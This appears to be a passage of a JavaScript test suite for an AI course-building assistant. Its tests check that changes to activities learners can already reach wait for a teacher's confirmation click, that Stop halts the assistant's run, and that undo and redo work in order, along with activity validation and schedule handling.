  ({ go: code } = await s.ok('POST', 'courses', { title: courseName }));
  code = code.split('/').at(-1);
  const { go } = await s.ok('POST', `courses/${code}/activities`, { title: 'Practice', kind: 'writing' });
  key = go.split('/').at(-1);
  const page = await s.page(`courses/${code}/activities/${key}`);
  assert.match(page, new RegExp(`/console/ask\\?course=${code}&amp;activity=${key}`), 'its page leads to Ask, bringing it along');
  assert.match(await s.page(`ask?course=${code}&activity=${key}`), /What should change in “Practice”\?/);

  const response = await s.api('POST', 'ask', { message: 'Make it shorter.', about: { course: code, activity: key } });
  const events = (await response.text()).split('\n\n').filter(Boolean).map((frame) => ({ name: /^event: (.+)$/m.exec(frame)?.[1], data: JSON.parse(/^data: (.+)$/m.exec(frame)?.[1] || 'null') }));
  assert.match(s.sent[0].messages[0].content, new RegExp(`the activity “Practice” \\(activity: ${key}\\)`), 'the model is told what they mean');
  const thread = threadOf(events);
  let { course } = await s.ok('GET', `courses/${code}/download`);
  assert.equal(course.activities[0].minutes, 15, 'hidden, so it changes now');
  assert.equal(course.activities[0].teaching.goal, 'Say why two fractions are equal.');
  assert.ok(events.some((event) => event.name === 'done' && event.data.words), 'it says how long it worked');

  await s.ok('POST', `courses/${code}/activities/${key}/release`, { release: 'open' });
  const again = await s.ask('Rename it.', thread);
  ({ course } = await s.ok('GET', `courses/${code}/download`));
  assert.equal(course.activities[0].title, 'Practice', 'learners can reach it, so nothing changed yet');
  const card = again.find((event) => event.name === 'card' && /Change it/.test(event.data.html)).data.html;
  const api = /data-api="POST (ask\/thr_[a-f0-9]+\/pending\/pnd_[a-f0-9]+)"/.exec(card)[1];
  await s.ok('POST', api, { yes: true });
  ({ course } = await s.ok('GET', `courses/${code}/download`));
  assert.equal(course.activities[0].title, 'Practice, renamed', 'a person’s click does it');
  assert.match((await s.ok('POST', api, { yes: true })).said, /already settled/);
});

test('a conversation can be deleted, one or all, and what it set up stays', async () => {
  const s = await server(['Hello.', 'Hello again.']);
  const first = threadOf(await s.ask('One.'));
  const second = threadOf(await s.ask('Two.'));
  const home = await s.page('ask');
  assert.match(home, new RegExp(`data-forget="${first}"`));
  assert.match(home, /data-forget-all/);
  assert.deepEqual(await s.ok('DELETE', `ask/${first}`, {}), { removed: 1 });
  assert.doesNotMatch(await s.page('ask'), new RegExp(first));
  assert.equal((await s.api('POST', 'ask', { message: 'Three.', thread: first })).status, 404);
  assert.deepEqual(await s.ok('DELETE', 'ask', {}), { removed: 1 });
  assert.doesNotMatch(await s.page('ask'), new RegExp(second));
});

test('a reply’s list stays a list when a line leads into it, and work folds into a line', async () => {
  const s = await server(following([
    () => [call('list_courses', {})],
    'I assumed:\n- Grade 5\n- About 20 minutes\n\nTell me when to open it.'
  ]));
  const events = await s.ask('Fractions.');
  const html = events.find((event) => event.name === 'said').data.html;
  assert.match(html, /<p>I assumed:<\/p><ul><li>Grade 5<\/li><li>About 20 minutes<\/li><\/ul><p>Tell me when to open it\.<\/p>/);
  const page = await s.page(`ask/${threadOf(events)}`);
  assert.match(page, /class="ask-run"/);
  assert.match(page, /Worked for /);
  assert.match(page, /1 step/);
});

test('a list of names reads as one however a spreadsheet wrote it', () => {
  for (const list of [
    '| Name | Score |\n| --- | --- |\n| Ada Lovelace | 92 |\n| Grace Hopper | 88 |\n| Katherine Johnson | 95 |',
    'Ada,92\nGrace,88\nKatherine,95',
    'Ada Lovelace 92 A\nGrace Hopper 88 B+\nKatherine Johnson 95 A',
    '1. Lovelace, Ada\t92\n2. Hopper, Grace\t88\n3. Johnson, Katherine\t95'
  ]) assert.ok(looksLikeClassList(list), list);
  for (const note of ['Fractions for grade 5, please.\nThey keep adding the denominators.', 'Make it a practice set with 5 questions.', '| Topic | Week |\n| --- | --- |\n| Add the fractions in this unit | 2 |']) assert.ok(!looksLikeClassList(note), note);
  const padding = Array.from({ length: 40 }, (_, at) => `This is a sentence about fractions number ${at}, and it goes on a little.`).join('\n');
  assert.ok(holdsClassList(`${padding}\nAda Lovelace, 92\nGrace Hopper, 88\nKatherine Johnson, 95\nMary Jackson, 91\nDorothy Vaughan, 90\nChristine Darden, 89\n${padding}`), 'a list inside a long file');
  assert.ok(!holdsClassList(padding), 'prose isn’t');
});

test('Stop stops, whatever the run saves meanwhile, and a card waits until the run is over', async () => {
  let code;
  let key;
  let thread;
  let s;
  s = await server(following([
    'Hello.',
    async () => { await s.ok('POST', `ask/${thread}/stop`, {}); return [call('list_courses', {}), call('list_courses', {})]; },
    'This should never be reached.',
    'Back again.'
  ]));
  ({ go: code } = await s.ok('POST', 'courses', { title: 'Fractions' }));
  code = code.split('/').at(-1);
  ({ go: key } = await s.ok('POST', `courses/${code}/activities`, { title: 'Practice', kind: 'writing' }));
  key = key.split('/').at(-1);
  // A thread to stop: the first message ends at once, then the second is stopped in its first call.
  thread = threadOf(await s.ask('Hello.'));
  const stoppedFrom = s.sent.length;
  const events = await s.ask('Do a lot.', thread);
  assert.ok(events.some((event) => event.name === 'said' && /Stopped/.test(event.data.html)), JSON.stringify(events.map((event) => event.name)));
  assert.ok(s.sent.length - stoppedFrom <= 1, 'one call was under way, and no more are paid for');
  assert.ok(events.filter((event) => event.name === 'step' && event.data.state === 'done').length === 0, 'nor does it go on with the rest of what it was doing');
  assert.equal((await s.ask('Again.', thread)).some((event) => event.name === 'said' && /Stopped/.test(event.data.html)), false, 'the next message starts clean');
});

test('a scheduled activity is one learners will meet, and a copy has questions of its own', async () => {
  let code;
  let key;
  const s = await server(following([
    () => [call('change_activity', { course: code, activity: key, title: 'Renamed' })],
    'Asked.'
  ]));
  ({ go: code } = await s.ok('POST', 'courses', { title: 'Fractions' }));
  code = code.split('/').at(-1);
  const page = await s.page(`courses/${code}`);
  const version = /name="version" value="([^"]+)"/.exec(page)?.[1];
  ({ go: key } = await s.ok('POST', `courses/${code}/activities`, { title: 'Practice', kind: 'questions', version }));
  key = key.split('/').at(-1);
  const { doc } = { doc: await s.ok('GET', `courses/${code}/download`) };
  const held = doc.course.activities.find((item) => item.title === 'Practice');
  assert.ok(held.workspace.panels[0].set_ref);
  // Copied, it holds a set of its own.
  const copied = await s.ok('POST', `courses/${code}/activities/${key}/copy`, {});
  const after = await s.ok('GET', `courses/${code}/download`);
  const [one, two] = after.course.activities;
  assert.notEqual(one.workspace.panels[0].set_ref, two.workspace.panels[0].set_ref, 'its own questions');
  assert.ok(copied.go);
  // It opens later: asked, not done.
  const body = await s.page(`courses/${code}/activities/${key}`);
  const formVersion = /name="version" value="([^"]+)"/.exec(body)[1];
  await s.ok('PUT', `courses/${code}/activities/${key}`, { version: formVersion, title: 'Practice', kind: 'questions', panel: { set_ref: one.workspace.panels[0].set_ref }, release: 'scheduled', opens_at: new Date(Date.now() + 86400000).toISOString(), teaching: {} });
  const events = await s.ask('Rename it.');
  assert.ok(events.some((event) => event.name === 'card' && /Change it/.test(event.data.html)), 'a button, since learners will meet it when it opens');
  const now = await s.ok('GET', `courses/${code}/download`);
  assert.equal(now.course.activities[0].title, 'Practice');
});

test('on a button that changes what learners meet, each question shows with its answer; a reading won’t replace questions', async () => {
  let code;
  let key;
  const s = await server(following([
    () => [call('change_questions', { course: code, activity: key, add: [{ type: 'fill', prompt: 'What is 1/2 + 1/2?', accept: ['1'] }] })],
    'Asked.'
  ]));
  ({ go: code } = await s.ok('POST', 'courses', { title: 'Fractions' }));
  code = code.split('/').at(-1);
  ({ go: key } = await s.ok('POST', `courses/${code}/activities`, { title: 'Practice', kind: 'questions' }));
  key = key.split('/').at(-1);
  await s.ok('POST', `courses/${code}/activities/${key}/release`, { release: 'open' });
  const events = await s.ask('Add one.');
  const card = events.find((event) => event.name === 'card' && /Change it/.test(event.data.html)).data.html;
  assert.match(card, /What is 1\/2 \+ 1\/2\?/);
  assert.match(card, /answer: 1/);
});

test('where several steps have questions, a change names its step, and none is changed by guess', async () => {
  let code;
  const TWO = [
    { title: 'Warm up', shows: 'questions', ai: false, questions: [{ type: 'fill', prompt: 'Warm up one?', accept: ['1'] }] },
    { title: 'On your own', shows: 'questions', ai: false, questions: [{ type: 'fill', prompt: 'On your own one?', accept: ['2'] }] }
  ];
  const changed = { type: 'fill', prompt: 'Changed?', accept: ['3'] };
  const s = await server(following([
    () => [call('add_activity', { course: code, title: 'Practice', steps: TWO })],
    () => [call('change_questions', { course: code, activity: 'practice', replace: [{ id: 'q1', ...changed }] })],
    () => [call('change_questions', { course: code, activity: 'practice', step: 'On your own', replace: [{ id: 'q1', ...changed }] })],
    'Done.'
  ]));
  ({ go: code } = await s.ok('POST', 'courses', { title: 'Fractions' }));
  code = code.split('/').at(-1);
  const events = await s.ask('Make it, then change the first question of On your own.');
  assert.ok(events.some((event) => event.name === 'step' && event.data.state === 'failed' && /Questions are in “Warm up”, “On your own”: say which step/.test(event.data.html)));
  const doc = await s.ok('GET', `courses/${code}/download`);
  assert.deepEqual(doc.question_sets.map((set) => set.items.map((item) => item.prompt)), [['Warm up one?'], ['Changed?']]);
});

test('a change waiting on a button says each value in words, and every part of it', async () => {
  let code;
  let key;
  const s = await server(following([
    () => [call('change_activity', { course: code, activity: key, help: 'ask_first', feedback: 'end', tries: 0, starters: ['I’m stuck'] })],
    'Asked.'
  ]));
  ({ go: code } = await s.ok('POST', 'courses', { title: 'Fractions' }));
  code = code.split('/').at(-1);
  ({ go: key } = await s.ok('POST', `courses/${code}/activities`, { title: 'Practice', kind: 'questions' }));
  key = key.split('/').at(-1);
  await s.ok('POST', `courses/${code}/activities/${key}/release`, { release: 'open' });
  const card = (await s.ask('Make it ask first.')).find((event) => event.name === 'card' && /Change it/.test(event.data.html)).data.html;
  for (const words of ['How far the AI may go: Asks questions', 'When they find out: Once all are answered', 'Tries per question: As many as they like', 'What learners can tap to say: I’m stuck']) assert.ok(card.includes(words), words);
  assert.doesNotMatch(card, /ask_first|: end\b|: 0\b/);
});

const CASE_STEPS = [
  { title: 'The case', shows: 'page', ai: false, text: 'A beekeeper says **the bees are vanishing** because of phone masts.' },
  { title: 'Your first call', shows: 'questions', ai: false, feedback: 'none', questions: [{ type: 'single', prompt: 'Is it true?', choices: ['Yes', 'No', 'Can’t tell'], right: ['Can’t tell'] }] },
  { title: 'Question it', shows: 'page', ai: true, text: 'Defend your call to a skeptic.', ai_does: 'Plays a friendly skeptic. Never says who is right.', ai_says: 'So what’s your call, and what moved you most?', starters: ['I think it’s false'] },
  { title: 'Make your case', shows: 'writing', ai: true, prompt: 'Write your claim, evidence and reasoning.', rubric: ['Claim: says what you think', 'Evidence: names a source'], ai_does: 'Only checks against the rubric.', keep_earlier: true }
];

test('an activity is written as steps: what learners read is on the page, and what the AI is told stays off it', async () => {
  let course;
  const s = await server((body, at) => {
    if (at === 0) return [call('create_course', { title: 'Science' })];
    if (at === 1) { course = JSON.parse(body.messages.at(-1).content).course; return [call('add_activity', { course, title: 'AI Claim Detectives', design: 'claim-evidence-reasoning', goal: 'Weigh a claim', help: 'hint', role: 'A friendly skeptic', minutes: 30, steps: CASE_STEPS })]; }
    return 'Done.';
  });
  const events = await s.ask('An activity on judging AI claims about bees');
  const added = JSON.parse(s.sent[2].messages.at(-1).content);
  assert.equal(added.activity, 'ai-claim-detectives');
  assert.equal(added.review, undefined, 'nothing here for it to fix');
  const cards = events.filter((event) => event.name === 'card').map((event) => event.data.html).join('');
  assert.match(cards, /So what’s your call, and what moved you most\?/, 'the first message is on the card');
  assert.match(cards, /About 30 minutes/);
  assert.match(cards, /Built on Claim, evidence, reasoning/);
  assert.doesNotMatch(cards, /Never says who is right/, 'what the AI is told isn’t on a card');
  const read = await s.ok('GET', 'ask/choices');
  assert.deepEqual(read.courses[0].activities.map((activity) => [activity.title, activity.kind]), [['AI Claim Detectives', 'several']]);
  const page = await s.page(`courses/${course}/activities/ai-claim-detectives`);
  assert.match(page, /The case/);
});

test('changing a conversation into steps changes that activity: there is no second one, and a wrong key is said without touching anything', async () => {
  let course;
  const s = await server((body, at) => {
    const last = body.messages.at(-1);
    if (at === 0) return [call('create_course', { title: 'Science' })];
    if (at === 1) { course = JSON.parse(last.content).course; return [call('add_activity', { course, title: 'Bees', kind: 'chat' })]; }
    if (at === 2) return 'Done.';
    if (at === 3) return [call('change_activity', { course, activity: 'nope', title: 'Bees again' })];
    if (at === 4) { assert.match(last.content, /No activity here goes by “nope”.*bees \(“Bees”\)/); return [call('change_activity', { course, activity: 'Bees', steps: CASE_STEPS, says: undefined })]; }
    if (at === 5) return [call('add_activity', { course, title: 'bees', kind: 'chat' })];
    if (at === 6) { assert.match(last.content, /already has “Bees”/); return 'Done.'; }
    return 'Done.';
  });
  const first = await s.ask('A conversation about bees');
  const review = JSON.parse(s.sent[2].messages.at(-1).content).review;
  assert.ok(review.some((note) => note.level === 'fix' && /empty box/.test(note.says)), 'a bare conversation is told what is wrong with it');
  const events = await s.ask('Make it better', threadOf(first));
  assert.ok(events.some((event) => event.name === 'step' && event.data.state === 'failed' && /this didn’t work/.test(event.data.label)));
  const { courses } = await s.ok('GET', 'ask/choices');
  assert.deepEqual(courses[0].activities.map((activity) => activity.title), ['Bees']);
  const { activities } = courses[0];
  assert.equal(activities[0].kind, 'several');
});

test('a reading step needs its PDF, a step needs what it shows, and six steps is the most', async () => {
  let course;
  const tries = [
    [{ title: 'Read', shows: 'reading' }],
    [{ title: 'Read', shows: 'page', text: '' }],
    [{ title: 'Write', shows: 'writing' }],
    [{ title: 'Answer', shows: 'questions' }],
    Array.from({ length: 7 }, (_, index) => ({ title: `S${index}`, shows: 'page', text: 'x' }))
  ];
  const s = await server((body, at) => {
    const last = body.messages.at(-1);
    if (at === 0) return [call('create_course', { title: 'Science' })];
    if (at === 1) course = JSON.parse(last.content).course;
    if (at >= 1 && at <= tries.length) return [call('add_activity', { course, title: `Try ${at}`, steps: tries[at - 1] })];
    return 'Done.';
  });
  const events = await s.ask('Go');
  const failed = events.filter((event) => event.name === 'step' && event.data.state === 'failed').map((event) => event.data.html).join('\n');
  for (const words of [/needs its PDF/, /a page with nothing on it/, /doesn’t say what to write/, /has no questions/, /at most 6 steps/]) assert.match(failed, words);
  const { courses } = await s.ok('GET', 'ask/choices');
  assert.deepEqual(courses[0].activities, [], 'nothing half-made is left behind');
});

test('what a message changed can be undone, and redone, a course at a time and only in order', async () => {
  let course;
  const s = await server((body, at) => {
    const last = body.messages.at(-1);
    if (at === 0) return [call('create_course', { title: 'Science' })];
    if (at === 1) { course = JSON.parse(last.content).course; return [call('add_activity', { course, title: 'Bees', goal: 'Weigh a claim', steps: CASE_STEPS })]; }
    if (at === 2) return 'Made it.';
    if (at === 3) return [call('change_activity', { course, activity: 'bees', title: 'Bees and phones' })];
    return 'Changed it.';
  });
  const first = await s.ask('An activity on bees');
  const thread = threadOf(first);
  const made = first.find((event) => event.name === 'changed');
  assert.match(made.data.html, /Changed “Science”/);
  assert.match(made.data.html, /Undo/);
  const second = await s.ask('Rename it', thread);
  const changed = second.find((event) => event.name === 'changed');
  assert.match(changed.data.html, /Undo/);
  // The first can't be undone until the second has been.
  await assert.rejects(() => s.ok('POST', `ask/${thread}/undo/${made.data.id}`, {}), /latest change/);
  let page = await s.page(`ask/${thread}`);
  assert.equal([...page.matchAll(/\/undo\//g)].length, 1, 'one way back at a time');
  await s.ok('POST', `ask/${thread}/undo/${changed.data.id}`, {});
  assert.deepEqual((await s.ok('GET', 'ask/choices')).courses[0].activities.map((item) => item.title), ['Bees'], 'it is as it was');
  page = await s.page(`ask/${thread}`);
  assert.match(page, new RegExp(`/redo/${changed.data.id}`), 'and can go forward again');
  assert.match(page, new RegExp(`/undo/${made.data.id}`), 'and the one before it can go back now');
  await s.ok('POST', `ask/${thread}/redo/${changed.data.id}`, {});
  assert.deepEqual((await s.ok('GET', 'ask/choices')).courses[0].activities.map((item) => item.title), ['Bees and phones']);
  // The model hears of it, so it doesn't work from what it remembers.
  const told = (await s.store.get(`ask/threads/${thread}`)).messages.filter((message) => message.role === 'user').map((message) => message.content).join('\n');
  assert.match(told, /pressed Undo/);
  assert.match(told, /pressed Redo/);
});

test('a conversation keeps the teacher’s words for its name, not what it made, and a teacher can rename it', async () => {
  let course;
  const s = await server((body, at) => {
    if (at === 0) return [call('create_course', { title: 'Science' })];
    return 'Done.';
  });
  const events = await s.ask('Something long about a science course for my class this term');
  const thread = threadOf(events);
  assert.equal(events.filter((event) => event.name === 'thread').at(-1).data.title, 'Something long about a science course for my class this term');
  assert.equal(course, undefined);
  await s.ok('PUT', `ask/${thread}`, { title: 'Term two science' });
  assert.match(await s.page(`ask/${thread}`), /Term two science/);
  await assert.rejects(() => s.ok('PUT', `ask/${thread}`, { title: '  ' }), /Give it a name/);
});

test('sources it read are under the reply, and a card that adds nothing isn’t shown', async () => {
  let course;
  const pages = { 'https://en.example.org/bees': () => new Response('<title>Bees</title>Bees are fine.', { headers: { 'content-type': 'text/html' } }) };
  const s = await server((body, at) => {
    const last = body.messages.at(-1);
    if (at === 0) return [call('create_course', { title: 'Science' })];
    if (at === 1) { course = JSON.parse(last.content).course; return [call('add_activity', { course, title: 'Bees', goal: 'x', steps: CASE_STEPS })]; }
    if (at === 2) return [call('show_try', { course, activity: 'bees' }), call('show_share', { course })];
    return 'Done.';
  }, { pages });
  const events = await s.ask('An activity on bees');
  const kinds = events.filter((event) => event.name === 'card').map((event) => /class="ask-card[^"]*"[^>]*><h3>([^<]*)/.exec(event.data.html)?.[1]);
  assert.deepEqual(kinds, ['Bees', '1 question to look over', 'Science'], 'the activity with its Try button, its question to look over, and the new course: no separate try card, and no links to share with nothing open');
});

test('questions Ask wrote come back to look over, each with its answer, to change on its page or remove', async () => {
  let code;
  const s = await server(following([
    () => [call('add_activity', { course: code, title: 'Practice', steps: [{ title: 'Warm up', shows: 'questions', ai: false, questions: [{ type: 'single', prompt: 'Which is equal to 1/2?', choices: ['2/4', '2/3'], right: ['2/4'] }, { type: 'fill', prompt: '1/3 = ?/6', accept: ['2'] }] }] })],
    'Made it.'
  ]));
  ({ go: code } = await s.ok('POST', 'courses', { title: 'Fractions' }));
  code = code.split('/').at(-1);
  const events = await s.ask('Make a warm up.');
  const card = events.find((event) => event.name === 'card' && /2 questions to look over/.test(event.data.html)).data.html;
  assert.match(card, /class="is-right">[\s\S]*?2\/4/);
  assert.match(card, /Accepted: 2/);
  assert.match(card, /href="\/console\/courses\/fractions\/questions\/[\w-]+#q-q1">Change<\/a>/);
  const remove = /data-api="DELETE (courses\/fractions\/questions\/[\w-]+\/items\/q2)"/.exec(card);
  assert.ok(remove);
  await s.ok('DELETE', remove[1], {});
  const doc = await s.ok('GET', 'courses/fractions/download');
  assert.deepEqual(doc.question_sets[0].items.map((item) => item.id), ['q1']);
});

test('two versions side by side: one press chooses, and the turn waits for it', async () => {
  const s = await server([[call('offer_versions', { question: 'Which first message?', versions: [{ label: 'Shorter', text: 'What do you notice?' }, { label: 'With an example', text: 'Cut a pizza into 8. What do you notice?' }] })], 'Never said']);
  const events = await s.ask('Write the first message.');
  const card = events.find((event) => event.name === 'card').data.html;
  assert.match(card, /<h4>Shorter<\/h4>[\s\S]*?data-say-this="Use “Shorter”\."/);
  assert.match(card, /With an example/);
  assert.doesNotMatch(JSON.stringify(events), /Never said/, 'nothing more is asked of the model');
});

test('a schedule card sets when an activity opens and closes, through its own route', async () => {
  const s = await server(following([() => [call('show_schedule', { course: 'fractions' })], 'Here.']));
  await s.ok('POST', 'courses', { title: 'Fractions' });
  await s.ok('POST', 'courses/fractions/activities', { title: 'Practice', kind: 'questions' });
  const card = (await s.ask('When do things open?')).find((event) => event.name === 'card').data.html;
  assert.match(card, /<strong>Practice<\/strong><span class="v-note">Hidden<\/span>/);
  assert.match(card, /data-api="POST courses\/fractions\/activities\/practice\/schedule"/);
  await assert.rejects(s.ok('POST', 'courses/fractions/activities/practice/schedule', { opens_at: '2030-01-02T09:00:00.000Z', closes_at: '2030-01-01T09:00:00.000Z' }), /close after it opens/);
  await s.ok('POST', 'courses/fractions/activities/practice/schedule', { opens_at: '2030-01-02T09:00:00.000Z', closes_at: '2030-01-09T09:00:00.000Z' });
  const doc = await s.ok('GET', 'courses/fractions/download');
  assert.equal(doc.course.activities[0].opens_at, '2030-01-02T09:00:00.000Z');
  assert.equal(doc.course.activities[0].release, 'hidden', 'it waits for its time');
});
